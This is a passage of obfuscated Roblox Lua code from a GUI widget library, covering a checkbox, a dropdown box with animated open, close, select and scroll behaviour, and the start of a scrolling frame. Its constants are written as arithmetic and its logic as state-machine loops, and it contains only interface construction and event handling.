					v2095.__ImageRender = v2099;
					v2095.Box = v2099;
					v2094 = 515 - (263 + 244);
				end
				if (v2094 == 2) then
					v2098.BorderSizePixel = 0;
					v2098.Name = v1335 .. "VeraniumFillBox";
					v2098.ZIndex = v1361.ZIndex;
					v2094 = 3 + 0;
				end
				if (v2094 == (1692 - (1502 + 185))) then
					v2099.ImageRectSize = Vector2.new(50, 50);
					v2099.Name = v1335 .. "Box";
					v2099.ZIndex = v2098.ZIndex + 1 + 0;
					v2094 = 29 - 23;
				end
				if (v2094 == (20 - 12)) then
					v2096.Redraw(v2092);
					break;
				end
				if (v2094 == 3) then
					v2098.Size = UDim2.new(1527 - (629 + 898), 46 - 29, 0 - 0, 17);
					v2099.BackgroundTransparency = 366 - (12 + 353);
					v2099.BorderSizePixel = 0;
					v2094 = 4;
				end
				if (v2094 == (1915 - (1680 + 231))) then
					v2099.Size = UDim2.new(1, 0, 1 + 0, 0);
					v2099.Position = UDim2.new(0.5 + 0, 1149 - (212 + 937), 0.5, 0 + 0);
					v2099.AnchorPoint = Vector2.new(1062.5 - (111 + 951), 0.5);
					v2094 = 2 + 3;
				end
				if (6 == v2094) then
					v2097.Parent = v2098;
					v2099.MouseButton1Up:Connect(function()
						if (v2096.Protected == false) then
							local v3411 = 27 - (18 + 9);
							while true do
								if (v3411 == (0 + 0)) then
									v2096.Checked = not v2096.Checked;
									v2092:Check(true, true);
									v3411 = 535 - (31 + 503);
								end
								if (v3411 == 1) then
									v2095.CheckChanged:Fire(true);
									break;
								end
							end
						end
					end);
					v2095.__Instance = v2098;
					v2094 = 7;
				end
			end
		end, function(v2100)
			local v2101 = 1632 - (595 + 1037);
			while true do
				if (v2101 == (1447 - (189 + 1255))) then
					v2100['StartBoxTransparency'] = v2100['StartBoxColor3'];
					v2100['EndBoxTransparency'] = v2100['StartBoxColor3'];
					v2101 = 2 + 2;
				end
				if (v2101 == (5 - 1)) then
					v2100['Checked'] = function(v3195, v3196)
						local v3197 = 0;
						while true do
							if (v3197 == 0) then
								v3195.CheckChanged:Fire(v3196.Checked);
								v3196.Check(v3195.__Proxy, true, true);
								break;
							end
						end
					end;
					break;
				end
				if (v2101 == (1281 - (1170 + 109))) then
					v2100['StartBoxColor3'] = function(v3198, v3199)
						v3199.Check(v3198.__Proxy, true, true);
					end;
					v2100['EndBoxTransparency'] = v2100['StartBoxColor3'];
					v2101 = 1820 - (348 + 1469);
				end
				if (v2101 == (1290 - (1115 + 174))) then
					v2100['EndBoxColor3'] = v2100['StartBoxColor3'];
					v2100['FillBoxType'] = function(v3200, v3201)
						local v3202 = v3201.FillBoxType.Value;
						v3200.Box.Image = v3202;
					end;
					v2101 = 4 - 2;
				end
				if (v2101 == 0) then
					v2100['Size'] = function(v3204, v3205)
						v3204.__Instance.Size = UDim2.new(1014 - (85 + 929), v3205.Size, 0 + 0, v3205.Size);
					end;
					v2100['EndBoxColor3'] = function(v3207, v3208)
						if v3208.Checked then
							v3207.Box.ImageColor3 = v3208.EndBoxColor3;
						else
							v3207.Box.ImageColor3 = v3208.StartBoxColor3;
						end
					end;
					v2101 = 1868 - (1151 + 716);
				end
			end
		end, {CreateLabel=function(v2102, v2103)
			local v2104 = 0 + 0;
			local v2105;
			local v2106;
			local v2107;
			while true do
				if (v2104 == (4 + 0)) then
					v2105.__TextRender = v2107;
					v2105.Draw['Label'](v2105, v2105.__Fields);
					break;
				end
				if (v2104 == 3) then
					v2107.TextTransparency = v1361.TextTransparency;
					v2107.TextYAlignment = Enum.TextYAlignment.Center;
					v2107.Size = UDim2.new(0, 0, 1705 - (95 + 1609), 0);
					v2104 = 4;
				end
				if (v2104 == (3 - 2)) then
					v2107.Name = v1335 .. "Label";
					v2107.Text = v2103;
					v2107.BackgroundTransparency = 759 - (364 + 394);
					v2104 = 2;
				end
				if (v2104 == (0 + 0)) then
					v2105 = v1334(v2102);
					v2106 = v2105.__Instance;
					v2107 = Instance.new("TextLabel", v2106);
					v2104 = 1 + 0;
				end
				if (v2104 == 2) then
					v2107.BorderSizePixel = 0 + 0;
					v2107.Font = v1361.Font;
					v2107.TextColor3 = v1361.TextColor;
					v2104 = 3 + 0;
				end
			end
		end,Check=function(v2108, v2109, v2110)
			local v2111 = v1334(v2108);
			local v2112 = v2111.__Instance;
			local v2113 = v2111.Box;
			local v2114 = v2111.__Fields;
			if (v2109 == nil) then
				v2109 = true;
			end
			if (v2110 == nil) then
				v2110 = true;
			end
			local v2115, v2116, v2117, v2118, v2119, v2120, v2121 = 0 + 0, 357 + 343, 19 + 31, v2114.StartBoxColor3, v2114.EndBoxColor3, v2114.StartBoxTransparency, v2114.EndBoxTransparency;
			if not v2114.Checked then
				v2115, v2116, v2117, v2118, v2119, v2120, v2121 = 598 + 52, -(16 + 34), -(1006 - (719 + 237)), v2114.EndBoxColor3, v2114.StartBoxColor3, v2114.EndBoxTransparency, v2114.StartBoxTransparency;
			end
			if ((math.floor(v2113.ImageRectOffset.X) == math.floor(v2116 - v2117)) and v2109) then
				v2113.ImageColor3 = v2119;
				v2113.ImageTransparency = v2121;
				return;
			end
			local v2122 = v2115;
			local function v2123()
				repeat
					local v2807 = 0 - 0;
					while true do
						if (v2807 == (0 + 0)) then
							v1342.Heartbeat:Wait();
							v2113.ImageRectOffset = Vector2.new(v2122, 0 - 0);
							v2807 = 2 - 1;
						end
						if (v2807 == (2 - 1)) then
							v2113.ImageColor3 = v1359.MapColor(v2118, v2119, v2115, v2116, v2122);
							v2113.ImageTransparency = v1359.Map(v2122, v2115, v2116, v2120, v2121);
							v2807 = 2;
						end
						if (v2807 == (1993 - (761 + 1230))) then
							v2122 = v2122 + v2117;
							break;
						end
					end
				until math.floor(v2122) == math.floor(v2116) 
				v2113.ImageColor3 = v2119;
				v2113.ImageTransparency = v2121;
			end
			if v2109 then
				if v2110 then
					spawn(v2123);
				else
					v2123();
				end
			else
				v2113.ImageRectOffset = Vector2.new(v2116 - v2117);
				v2113.ImageColor3 = v2119;
				v2113.ImageTransparency = v2121;
			end
			v2123 = nil;
		end});
		v1363("DropdownBox", {Size={"\4\0\0Vector2",Vector2.new(78 + 37, 25)},Enabled={"\3\0\0boolean",true},Padding={"\3\0\0Vector2",Vector2.new(1 + 4, 1243 - (965 + 278))},ToggleSound={"\4\1\0Instance"},Text={"\3\0\0string","DropdownBox"},TextColor3={"\4\0\0Color3",v1361.TextColor},Count={"\3\0\1number",0},Scroll={"\3\0\0number",0},IsOpen={"\3\0\1boolean",false},CanUnselect={"\3\0\0boolean",false},SelectedIndex={"\2\1\0",nil},SelectedValue={"\2\1\1",nil},MaxDrop={"\3\0\0number",(2 + 1)},ShowSelected={"\3\0\0boolean",true},UseIndex={"\3\0\0boolean",false},BoxColor3={"\4\0\0Color3",v1361.BackgroundColor},BoxHoverColor3={"\4\0\0Color3",v1361.BackgroundColor},BoxOpenedColor3={"\4\0\0Color3",v1361.SecondaryColor},ArrowColor3={"\4\0\0Color3",v1358.Silver},ArrowSize={"\3\0\0number",10},Opened={"\4\0\1Event"},Closed={"\4\0\1Event"},ListChanged={"\4\0\1Event"},SelectionChanged={"\4\0\1Event"},ExpandTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.5 - 0, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},SlideTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},ScrollTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)},ElasticyTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},ItemHoverColor3={"\4\0\0Color3",v1361.HighlightColor},ItemHoverOffset={"\3\0\0number",10},ItemSelectedColor3={"\4\0\0Color3",v1361.HighlightColor},ItemSelectedOffset={"\3\0\0number",5},TitleHoverColor3={"\4\0\0Color3",v1361.TextColor},BorderSizePixel={"\3\0\0number",v1361.BorderSize},HoverBorderSizePixel={"\3\0\0number",v1361.BorderSize},OpenBorderSizePixel={"\3\0\0number",v1361.BorderSize},EndArrowColor3={"\4\0\0Color3",v1358.Silver}}, {Value="SelectedValue",ValueChanged="SelectionChanged"}, function(v2124, v2125, v2126, v2127)
			local v2128 = v1334(v2124);
			local v2129 = v2128.__Fields;
			local v2126 = v2126 or {};
			local v2130 = Instance.new("Frame", v1366(v2125));
			local v2131 = Instance.new("ImageLabel", v2130);
			local v2132 = Instance.new("ImageLabel", v2130);
			local v2133 = Instance.new("TextButton", v2130);
			local v2134 = Instance.new("Frame", v2130);
			local v2135 = Instance.new("Frame", v2134);
			v2130.BackgroundTransparency = 1 + 0;
			v2130.BorderSizePixel = 0 + 0;
			v2130.Name = v1335 .. "MagnoliaDropdownBox";
			v2131.Name = v1335 .. "Background";
			v2131.BackgroundTransparency = 1;
			v2131.Image = "rbxassetid://3570695787";
			v2131.ScaleType = Enum.ScaleType.Slice;
			v2131.SliceScale = 0.1;
			v2131.Size = UDim2.new(1, 0 + 0, 1 + 0, 158 - (139 + 19));
			v2131.SliceCenter = Rect.new(18 + 82, 2093 - (1687 + 306), 362 - 262, 100);
			v2131.Position = UDim2.new(1154.5 - (1018 + 136), 0 + 0, 0, 0);
			v2131.AnchorPoint = Vector2.new(0.5 - 0, 815 - (117 + 698));
			v2131.ZIndex = v2130.ZIndex;
			v2132.Name = v1335 .. "Arrow";
			v2132.BackgroundTransparency = 482 - (305 + 176);
			v2132.BorderSizePixel = 0 + 0;
			v2132.Image = "rbxassetid://3931363707";
			v2132.AnchorPoint = Vector2.new(1 + 0, 0.5);
			v2133.Name = v1335 .. "Title";
			v2133.BackgroundTransparency = 1;
			v2133.AnchorPoint = Vector2.new(0.5 - 0, 0);
			v2133.TextXAlignment = Enum.TextXAlignment.Left;
			v2133.Font = v1361.Font;
			v2133.TextColor3 = v1361.TextColor;
			v2133.TextSize = 8 + 0;
			v2134.Name = v1335 .. "ElementCanvas";
			v2134.BackgroundTransparency = 1;
			v2134.BorderSizePixel = 0 - 0;
			v2134.AnchorPoint = Vector2.new(0.5 - 0, 1);
			v2134.Position = UDim2.new(0.5, 0 - 0, 1, 0);
			v2134.ClipsDescendants = true;
			v2135.Name = v1335 .. "ElementContainer";
			v2135.BackgroundTransparency = 261 - (159 + 101);
			v2135.BorderSizePixel = 0;
			v2135.AnchorPoint = Vector2.new(0.5 - 0, 0 - 0);
			v2135.Position = UDim2.new(0.5 + 0, 0 - 0, 0, 0);
			v2135.Size = UDim2.new(1 - 0, 0 + 0, 266 - (112 + 154), 0 - 0);
			v2135.ClipsDescendants = false;
			local v2179 = 31 - (21 + 10);
			v2130.Changed:Connect(function(v2563)
				if (v2563 == "BackgroundColor3") then
					v2131.ImageColor3 = v2130.BackgroundColor3;
				end
			end);
			v2130.MouseEnter:Connect(function()
				if not v2129.IsOpen then
					v2130.BackgroundColor3 = v2129.BoxHoverColor3;
				end
			end);
			v2130.MouseLeave:Connect(function()
				if not v2129.IsOpen then
					v2130.BackgroundColor3 = v2129.BoxColor3;
				end
			end);
			v2133.MouseEnter:Connect(function()
				v2133.TextColor3 = v2129.TitleHoverColor3;
			end);
			v2133.MouseLeave:Connect(function()
				v2133.TextColor3 = v2129.TextColor3;
			end);
			v2133.MouseButton1Down:Connect(function()
				if not v2129.Enabled then
					return;
				end
				if not v2129.IsOpen then
					v2124:Open();
				else
					v2124:Close();
				end
			end);
			v2134.MouseWheelBackward:Connect(function()
				local v2568 = 0;
				local v2569;
				local v2570;
				while true do
					if (v2568 == (1719 - (531 + 1188))) then
						v2569 = v2128.List;
						v2570 = math.min(v2129.MaxDrop - 1, v2129.Count - (1 + 0));
						v2568 = 1;
					end
					if (v2568 == (665 - (96 + 567))) then
						v1338:Create(v2135, v2129.ScrollTweenInfo, {Position=UDim2.new(0.5 - 0, 0, 0, -v2129.Scroll * v2129.Size.Y)}):Play();
						break;
					end
					if (v2568 == 1) then
						v2129.Scroll = v2129.Scroll + 1 + 0;
						if (v2129.Scroll > ((v2129.Count - v2570) - (3 - 2))) then
							v2129.Scroll = (v2129.Count - v2570) - 1;
							v1338:Create(v2135, v2129.ElasticyTweenInfo, {Position=UDim2.new(1695.5 - (867 + 828), 0 - 0, 0 - 0, (-v2129.Scroll - (0.25 - 0)) * v2129.Size.Y)}):Play();
							v2179 = v2179 + (1 - 0);
							local v3417 = v2179;
							wait(v2129.ElasticyTweenInfo.Time);
							if (v3417 ~= v2179) then
								return;
							else
								v2179 = 0 + 0;
							end
						end
						v2568 = 3 - 1;
					end
				end
			end);
			v2134.MouseWheelForward:Connect(function()
				local v2571 = 771 - (134 + 637);
				local v2572;
				while true do
					if (v2571 == (1 + 0)) then
						if (v2129.Scroll < (1157 - (775 + 382))) then
							local v3418 = 0;
							local v3419;
							while true do
								if (v3418 == 0) then
									v2129.Scroll = 0 - 0;
									v1338:Create(v2135, v2129.ElasticyTweenInfo, {Position=UDim2.new(0.5, 607 - (45 + 562), 862 - (545 + 317), v2129.Size.Y * (0.25 - 0))}):Play();
									v3418 = 1027 - (763 + 263);
								end
								if ((1 + 1) == v3418) then
									wait(v2129.ElasticyTweenInfo.Time);
									if (v3419 ~= v2179) then
										return;
									else
										v2179 = 1750 - (512 + 1238);
									end
									break;
								end
								if (v3418 == (1595 - (272 + 1322))) then
									v2179 = v2179 + (1 - 0);
									v3419 = v2179;
									v3418 = 1248 - (533 + 713);
								end
							end
						end
						v1338:Create(v2135, v2129.ScrollTweenInfo, {Position=UDim2.new(28.5 - (14 + 14), 0, 0, -v2129.Scroll * v2129.Size.Y)}):Play();
						break;
					end
					if (v2571 == (825 - (499 + 326))) then
						v2572 = v2128.List;
						v2129.Scroll = v2129.Scroll - (1 - 0);
						v2571 = 1;
					end
				end
			end);
			v2128.__Instance = v2130;
			v2128.__Base2D = v2130;
			v2128.__ImageRender = v2131;
			v2128.__TextRender = v2133;
			v2128.ElementCanvas = v2134;
			v2128.ElementContainer = v2135;
			v2128.Arrow = v2132;
			v2128.Title = v2133;
			v2128.List = {};
			v2128.MouseHover = false;
			for v2573, v2574 in pairs(v2126) do
				v2129.AddItem(v2124, v2573, v2574);
			end
			if v2127 then
				v2129.Select(v2124, v2127);
			else
			end
			v2129.Redraw(v2124);
		end, function(v2190)
			v2190['SelectedIndex'] = function(v2575, v2576, v2577, v2578)
				v2576.Select(v2578, v2576.SelectedIndex);
			end;
			v2190['Padding'] = function(v2579, v2580)
				local v2581 = 424 - (104 + 320);
				local v2582;
				local v2583;
				local v2584;
				while true do
					if (v2581 == (2000 - (1929 + 68))) then
						v2584.Position = UDim2.new(1324 - (1206 + 117), -v2580.Padding.X, 0 + 0, math.floor(v2580.Size.Y / (1594 - (683 + 909))));
						v2584.Size = UDim2.new(0 - 0, v2580.ArrowSize, 0 - 0, v2580.ArrowSize);
						v2581 = 781 - (772 + 5);
					end
					if ((1429 - (19 + 1408)) == v2581) then
						v2579.Title.Position = UDim2.new(0.5, v2580.Padding.X, 288 - (134 + 154), 0);
						v2583.Size = UDim2.new(1 - 0, -v2580.Padding.X, 0, v2580.Size.Y);
						v2581 = 9 - 6;
					end
					if (4 == v2581) then
						v2579.ElementCanvas.Size = UDim2.new(1 + 0, 0, 1 + 0, -v2580.Size.Y);
						for v3312, v3313 in pairs(v2579.List) do
							local v3314 = 202 - (10 + 192);
							local v3315;
							while true do
								if (v3314 == 0) then
									v3315 = v3313.Item;
									v1338:Create(v3315, TweenInfo.new(47 - (13 + 34)), {Position=UDim2.new(0, v2580.Padding.X, 0, v2580.Size.Y * v3313.Ndx),Size=UDim2.new(1290 - (342 + 947), 0 - 0, 1708 - (119 + 1589), v2580.Size.Y)}):Play();
									break;
								end
							end
						end
						break;
					end
					if (v2581 == 1) then
						v2584 = v2579.Arrow;
						if not v2580.IsOpen then
							v2582.Size = UDim2.new(0 - 0, v2580.Size.X, 0 - 0, v2580.Size.Y);
						else
							v2582.Size = UDim2.new(552 - (545 + 7), v2580.Size.X, 0 - 0, v2580.Size.Y * (v2580.MaxDrop + 1));
						end
						v2581 = 2;
					end
					if (v2581 == 0) then
						v2582 = v2579.__Instance;
						v2583 = v2579.__TextRender;
						v2581 = 1 + 0;
					end
				end
			end;
			v2190['Size'] = v2190['Padding'];
			v2190['ArrowSize'] = v2190['Padding'];
			v2190['Text'] = function(v2585, v2586)
				local v2587 = 1703 - (494 + 1209);
				local v2588;
				while true do
					if (v2587 == (2 - 1)) then
						v2588.TextColor3 = v2586.TextColor3;
						for v3316, v3317 in pairs(v2585.List) do
							local v3318 = v3317.Item;
							v3318.Font = v2588.Font;
							v3318.TextSize = v2588.TextSize;
							v3318.TextColor3 = v2588.TextColor3;
						end
						break;
					end
					if (v2587 == (998 - (197 + 801))) then
						v2588 = v2585.__TextRender;
						if v2586.ShowSelected then
							if v2586.UseIndex then
								if (v2586.SelectedIndex ~= nil) then
									v2588.Text = tostring(v2586.SelectedIndex);
								else
									v2588.Text = v2586.Text;
								end
							elseif (v2586.SelectedValue ~= nil) then
								v2588.Text = tostring(v2586.SelectedValue);
							else
								v2588.Text = v2586.Text;
							end
						else
							v2588.Text = v2586.Text;
						end
						v2587 = 1 - 0;
					end
				end
			end;
			v2190['TextColor3'] = v2190['Text'];
			v2190['MaxDrop'] = function(v2589, v2590)
				if (v2590.IsOpen == false) then
					return;
				end
				v2589.__Instance.Size = UDim2.new(0, v2590.Size.X, 0 - 0, v2590.Size.Y * (v2590.MaxDrop + 1));
				if (v2590.Scroll < 0) then
					v2590.Scroll = 954 - (919 + 35);
				end
				local v2592 = (#v2589.List - v2590.MaxDrop) - (1 + 0);
				if (v2590.Scroll > v2592) then
					v2590.Scroll = v2592;
				end
				v1338:Create(v2589.ElementContainer, v2590.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0 - 0, -v2590.Scroll * v2590.Size.Y)}):Play();
			end;
			v2190['Scroll'] = v2190['MaxDrop'];
			v2190['UseIndex'] = function(v2593, v2594)
				for v2811, v2812 in pairs(v2593.List) do
					local v2813 = v2812.Item;
					if v2594.UseIndex then
						v2813.Text = v2812.Idx;
					else
						v2813.Text = tostring(v2812.Val);
					end
				end
			end;
			v2190['ItemSelectedColor3'] = function(v2595, v2596)
				if v2595.SelectedText then
					v2595.SelectedText.TextColor3 = v2596.ItemSelectedColor3;
				end
			end;
			v2190['BoxColor3'] = function(v2597, v2598)
				local v2599 = 0;
				local v2600;
				local v2601;
				while true do
					if (v2599 == (468 - (369 + 98))) then
						if v2598.IsOpen then
							local v3424 = 0;
							while true do
								if (v3424 == 0) then
									v2600.BackgroundColor3 = v2598.BoxOpenedColor3;
									v2601.BorderSizePixel = v2598.OpenBorderSizePixel;
									break;
								end
							end
						elseif v2597.MouseHover then
							v2600.BackgroundColor3 = v2598.BoxHoverColor3;
							v2601.BorderSizePixel = v2598.HoverBorderSizePixel;
						else
							v2600.BackgroundColor3 = v2598.BoxColor3;
							v2601.BorderSizePixel = v2598.BorderSizePixel;
						end
						break;
					end
					if (v2599 == 0) then
						v2600 = v2597.__Instance;
						v2601 = v2597.__ImageRender;
						v2599 = 1116 - (400 + 715);
					end
				end
			end;
			v2190['BoxHoverColor3'] = v2190['BoxColor3'];
			v2190['BorderSizePixel'] = v2190['BoxColor3'];
			v2190['OpenBorderSizePixel'] = v2190['BoxColor3'];
			v2190['HoverBorderSizePixel'] = v2190['BoxColor3'];
			v2190['ArrowColor3'] = function(v2602, v2603)
				if v2603.IsOpen then
					v2602.Arrow.ImageColor3 = v2603.EndArrowColor3;
				else
					v2602.Arrow.ImageColor3 = v2603.ArrowColor3;
				end
			end;
			v2190['EndArrowColor3'] = v2190['ArrowColor3'];
		end, {AddItem=function(v2208, v2209, v2210)
			local v2211 = 0;
			local v2212;
			local v2213;
			local v2214;
			local v2215;
			local v2216;
			local v2217;
			local v2218;
			local v2219;
			local v2220;
			local v2221;
			local v2222;
			while true do
				if (v2211 == (2 + 2)) then
					if v2217.UseIndex then
						v2220.Text = v2209;
					else
						v2220.Text = v2210;
					end
					v2221 = v2217.Count;
					v2217.Count = v2217.Count + 1 + 0;
					v2220.Position = UDim2.new(1325 - (744 + 581), v2217.Padding.X, 0, v2217.Size.Y * v2221);
					v2220.Size = UDim2.new(1 + 0, 0, 1622 - (653 + 969), v2217.Size.Y);
					v2211 = 9 - 4;
				end
				if (v2211 == 6) then
					v2220.MouseButton2Click:Connect(v2222);
					if v2217.IsOpen then
						v2217.Open(v2208, true);
					end
					v2219:Fire(true, v2209);
					return v2220;
				end
				if (v2211 == 3) then
					v2220.TextColor3 = v2217.TextColor3;
					v2220.Font = v2215.Font;
					v2220.TextSize = v2215.TextSize;
					v2220.TextColor3 = v2217.TextColor3;
					v2220.TextXAlignment = Enum.TextXAlignment.Left;
					v2211 = 1635 - (12 + 1619);
				end
				if ((168 - (103 + 60)) == v2211) then
					v2216[v2209] = {Ndx=v2221,Val=v2210,Item=v2220};
					v2220.MouseEnter:Connect(function()
						if (v2217.SelectedIndex == v2209) then
							return;
						end
						v1338:Create(v2220, v2217.SlideTweenInfo, {TextColor3=v2217.ItemHoverColor3,Position=UDim2.new(0 - 0, v2217.ItemHoverOffset, 0 - 0, v2217.Size.Y * v2216[v2209].Ndx)}):Play();
					end);
					v2220.MouseLeave:Connect(function()
						local v3229 = 0 - 0;
						while true do
							if (v3229 == (1662 - (710 + 952))) then
								if (v2217.SelectedIndex == v2209) then
									return;
								end
								v1338:Create(v2220, v2217.SlideTweenInfo, {TextColor3=v2217.TextColor3,Position=UDim2.new(1868 - (555 + 1313), v2217.Padding.X, 0, v2217.Size.Y * v2216[v2209].Ndx)}):Play();
								break;
							end
						end
					end);
					function v2222()
						if (v2217.SelectedIndex == v2209) then
							if v2217.CanUnselect then
								v2208:Unselect();
							end
						else
							v2208:Select(v2209);
						end
					end
					v2220.MouseButton1Click:Connect(v2222);
					v2211 = 6 + 0;
				end
				if (v2211 == (1 + 0)) then
					v2216 = v2212.List;
					v2217 = v2212.__Fields;
					v2218 = v2217.Padding;
					v2219 = v2212.ListChanged;
					if not v2209 then
						v2209 = v2217.Count + 1 + 0;
					end
					v2211 = 1470 - (1261 + 207);
				end
				if (v2211 == 0) then
					if (v2210 == nil) then
						return error("Val cannot be nil.");
					end
					v2212 = v1334(v2208);
					v2213 = v2212.ElementCanvas;
					v2214 = v2212.ElementContainer;
					v2215 = v2212.__TextRender;
					v2211 = 1;
				end
				if (v2211 == 2) then
					if v2216[v2209] then
						return error("Idx already present in the list");
					end
					v2220 = Instance.new("TextButton", v2214);
					v2220.Name = v1335 .. tostring(v2209);
					v2220.BackgroundTransparency = 253 - (245 + 7);
					v2220.BorderSizePixel = 747 - (212 + 535);
					v2211 = 3;
				end
			end
		end,RemoveItem=function(v2223, v2224)
			local v2225 = v1334(v2223);
			local v2226 = v2225.List;
			local v2227 = v2225.__Fields;
			local v2228 = v2227.Padding;
			local v2229 = v2225.ListChanged;
			local v2230 = v2226[v2224];
			if (v2230 == nil) then
				return;
			end
			v2230.Item:Remove();
			v2230.Item:Destroy();
			if (type(v2224) ~= "number") then
				v2226[v2224] = nil;
				local v2815 = 0 - 0;
				for v3059, v3060 in next, v2226 do
					local v3061 = v3060.Item;
					v3060.Ndx = v2815;
					v3061.Position = UDim2.new(1476 - (905 + 571), v2227.Padding.X, 0 - 0, v2227.Size.Y * v2815);
					v2815 = v2815 + 1;
				end
			else
				local v2816 = 0 - 0;
				while true do
					if (0 == v2816) then
						table.remove(v2226, v2224);
						for v3425 = v2224, #v2226, 3 - 2 do
							local v3426 = v2226[v3425].Item;
							v2226[v3425].Ndx = v3425;
							v3426.Position = UDim2.new(0, v2227.Padding.X, 0, v2227.Size.Y * v3425);
						end
						break;
					end
				end
			end
			v2230 = nil;
			if (v2227.SelectedIndex == v2224) then
				local v2817 = 0;
				while true do
					if (v2817 == (0 + 0)) then
						v2227.SelectedIndex = nil;
						v2227.SelectedValue = nil;
						break;
					end
				end
			end
			v2227.Count = v2227.Count - (1464 - (522 + 941));
			if v2227.IsOpen then
				v2227.Open(v2223, true);
			end
			v2229:Fire(false, v2224);
			return;
		end,GetOpenSize=function(v2232)
			local v2233 = v1334(v2232);
			local v2234 = v2233.__Fields;
			local v2235 = v2234.MaxDrop;
			return math.min(v2234.MaxDrop + (1512 - (292 + 1219)), v2234.Count + 1) * v2234.Size.Y;
		end,Open=function(v2236, v2237)
			local v2238 = v1334(v2236);
			local v2239 = v2238.__Fields;
			local v2240 = v2238.__Instance;
			local v2241 = v2238.Arrow;
			if (v2239.IsOpen and (v2237 == nil)) then
				return;
			end
			v2239.IsOpen = true;
			v1338:Create(v2240, v2239.ExpandTweenInfo, {Size=UDim2.new(1112 - (787 + 325), v2239.Size.X, 0 - 0, v2239.GetOpenSize(v2236)),BackgroundColor3=v2239.BoxOpenedColor3}):Play();
			v1338:Create(v2241, v2239.ExpandTweenInfo, {Rotation=(161 + 19)}):Play();
			v2239.IsOpen = true;
			if not v2237 then
				local v2818 = 0 - 0;
				while true do
					if (v2818 == (534 - (424 + 110))) then
						v2238.Opened:Fire();
						if v2239.ToggleSound then
							v2239.ToggleSound:Play();
						end
						break;
					end
				end
			end
		end,Close=function(v2243)
			local v2244 = 0 + 0;
			local v2245;
			local v2246;
			local v2247;
			local v2248;
			local v2249;
			while true do
				if (v2244 == 0) then
					v2245 = v1334(v2243);
					v2246 = v2245.List;
					v2247 = v2245.__Fields;
					v2244 = 1 + 0;
				end
				if (v2244 == (1 + 2)) then
					v2247.IsOpen = false;
					v2245.Closed:Fire();
					if v2247.ToggleSound then
						v2247.ToggleSound:Play();
					end
					break;
				end
				if (v2244 == 2) then
					v2247.IsOpen = false;
					v1338:Create(v2248, v2247.ExpandTweenInfo, {Size=UDim2.new(0, v2247.Size.X, 312 - (33 + 279), v2247.Size.Y),BackgroundColor3=v2247.BoxColor3}):Play();
					v1338:Create(v2249, v2247.ExpandTweenInfo, {Rotation=(0 + 0)}):Play();
					v2244 = 1356 - (1338 + 15);
				end
				if (v2244 == 1) then
					v2248 = v2245.__Instance;
					v2249 = v2245.Arrow;
					if (v2247.IsOpen == false) then
						return;
					end
					v2244 = 1425 - (528 + 895);
				end
			end
		end,Select=function(v2250, v2251)
			local v2252 = v1334(v2250);
			local v2253 = v2252.__Fields;
			local v2254 = v2252.List;
			local v2255 = v2254[v2251];
			if v2255 then
				local v2819 = 0 + 0;
				while true do
					if (v2819 == 0) then
						v2253.SelectedIndex = v2251;
						v2253.SelectedValue = v2255.Val;
						v2819 = 1925 - (1606 + 318);
					end
					if (v2819 == (1821 - (298 + 1521))) then
						v2252.ItemTween = v1338:Create(v2255.Item, v2253.SlideTweenInfo, {TextColor3=v2253.ItemSelectedColor3,Position=UDim2.new(0 - 0, v2253.ItemSelectedOffset, 310 - (154 + 156), v2253.Size.Y * v2255.Ndx)});
						v2252.ItemTween:Play();
						v2819 = 3;
					end
					if (v2819 == 1) then
						v2252.SelectedText = v2255.Item;
						v2252.Draw['Text'](v2252, v2253);
						v2819 = 7 - 5;
					end
					if (v2819 == (5 - 2)) then
						v2252.SelectionChanged:Fire(v2251, v2255.Val);
						return true;
					end
				end
			else
				return false;
			end
		end,Unselect=function(v2256)
			local v2257 = v1334(v2256);
			local v2258 = v2257.__Fields;
			local v2259 = v2257.List;
			local v2260;
			for v2604, v2605 in pairs(v2259) do
				if (v2605.Idx == v2258.SelectedIndex) then
					v2260 = v2605;
					break;
				end
			end
			v2258.SelectedIndex = nil;
			v2258.SelectedValue = nil;
			v2257.SelectedText = nil;
			v2258.Redraw(v2256, "Text");
			v1338:Create(v2260.Item, v2258.SlideTweenInfo, {TextColor3=v2258.ItemSelectedColor3,Position=UDim2.new(0, v2258.Padding.X, 0, v2258.Size.Y * v2260.Ndx)}):Play();
			v2257.SelectionChanged:Fire();
		end});
		v1363("ScrollingFrame", {Container={"\2\1\1"},MaxLayer={"\3\0\0number",10},AutoAdjust={"\3\0\0boolean",false},ScrollTweenInfo={"\4\0\0TweenInfo"},GripSize={"\3\0\0number",3},GripVisible={"\3\0\0boolean",false},IsTravelling={"\3\0\1boolean",false},CanScroll={"\3\0\0boolean",true},FreeScroll={"\3\0\0boolean",false},Step={"\3\0\0number",(1 - 0)},StepSize={"\3\0\0number",25},Layer={"\3\0\1number",(0 + 0)},OnTop={"\3\0\1boolean",true},OnBottom={"\3\0\1boolean",false},Travelling={"\4\0\1Event"},ScrollingUp={"\4\0\1Event"},ScrollingDown={"\4\0\1Event"},BottomTouched={"\4\0\1Event"},TopTouched={"\4\0\1Event"}}, {}, function(v2264, v2265, v2266)
			local v2267 = v1334(v2264);
			local v2268 = v2267.__Fields;
			v2268.GripColor = v1358.ElectricBlue;
			v2268.ScrollTweenInfo = v2266;
			local v2272 = Instance.new("Frame", v1366(v2265));
			local v2273 = Instance.new("Frame", v2272);
			local v2274 = Instance.new("Frame", v2272);
			v2268.Container = v2274;
			v2267.Container = v2274;
			v2272.Name = v1335 .. "ScrollingFrame";
			v2272.BackgroundTransparency = 1 + 0;
			v2272.Size = UDim2.new(0 + 0, 200, 0, 349 - 149);
			v2273.Name = "Grip";
			v2273.BorderSizePixel = 0 - 0;
			v2273.AnchorPoint = Vector2.new(1170 - (854 + 315), 0 - 0);
			v2273.Position = UDim2.new(1 + 0, 44 - (31 + 13), 0 - 0, 0);
			v2274.Name = v1335 .. "Container";
			v2274.AnchorPoint = Vector2.new(0.5 - 0, 0 + 0);
			v2274.Position = UDim2.new(0.5, 563 - (281 + 282), 0 - 0, 0 + 0);
			v2274.BackgroundTransparency = 950 - (216 + 733);
			v2274.Size = UDim2.new(1848 - (137 + 1710), 0, 2 - 1, 538 - (100 + 438));
